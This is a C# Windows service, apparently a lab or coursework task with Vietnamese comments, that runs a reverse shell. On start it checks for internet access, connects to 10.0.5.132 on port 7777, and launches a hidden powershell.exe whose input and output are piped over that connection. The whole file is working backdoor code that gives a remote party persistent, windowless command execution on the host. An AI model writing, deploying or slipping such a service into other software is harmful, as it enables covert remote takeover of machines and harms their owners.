using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace Task3
{
    public partial class Service1 : ServiceBase
    {
        //Khởi tạo StreamWriter
        static StreamWriter writer;
        public Service1()
        {
            InitializeComponent();
        }
        //Khi service được khởi động
        protected override void OnStart(string[] args)
        {
            WriteToFile("Service started at " + DateTime.Now);
            if (CheckForInternetConnection())
            {
                WriteToFile("Connected");
                ReverseShellService();
            }
            else
                WriteToFile("Not connected");
            
        }
        //Khi service ngưng 
        protected override void OnStop()
        {
            WriteToFile("Service stopped at " + DateTime.Now);
        }
        //Hàm kiểm tra kết nối internet
        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }
        //Hàm mở kết nối ReverseShell
        public void ReverseShellService()
        {
            //Kết nối tới máy có địa chỉ IP 10.0.5.132 với port 7777
            using (TcpClient client = new TcpClient("10.0.5.132", 7777))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        writer = new StreamWriter(stream);
                        StringBuilder strInput = new StringBuilder();
                        //Tạo tiến trình mới
                        Process p = new Process();
                        //Mở file powershell để reverse shell
                        p.StartInfo.FileName = "powershell.exe";
                        //Điều chỉnh các thông số ban đầu của tiến trình
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        //Xử lý dữ liệu nhập xuất với hàm CmdOutputDataHandler
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        //Bắt đầu tiến trình
                        p.Start();
                        p.BeginOutputReadLine();
                        //Xử lý dữ liệu được nhập 
                        while (true)
                        {
                            strInput.Append(reader.ReadLine());
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }                              
                    }
                }
            }
        }
        //Hàm để xử lý dữ liệu nhập vào, xử lý lỗi xảy ra
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!string.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    writer.WriteLine(strOutput);
                    writer.Flush();
                }
                catch (Exception err) { }
            }
        }
        //Hàm viết vào file Logs
        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory +
           "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') +
           ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to.
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }
    }
}
